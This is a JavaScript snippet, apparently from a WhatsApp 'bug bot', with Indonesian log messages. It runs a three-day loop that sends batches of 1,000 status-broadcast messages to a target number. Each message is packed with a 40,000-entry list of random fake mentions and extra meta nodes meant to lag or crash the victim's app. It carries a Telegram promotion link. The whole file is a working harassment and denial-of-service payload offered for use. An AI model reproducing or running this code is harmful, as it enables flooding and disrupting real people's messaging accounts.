async function execDelay(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 1000) {
        await exDelay(target);
        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/1000 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 1000 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function exDelay(target) {
await tdx.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `XrL ~ Dominations\n https://t.me/xrellyy\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);
}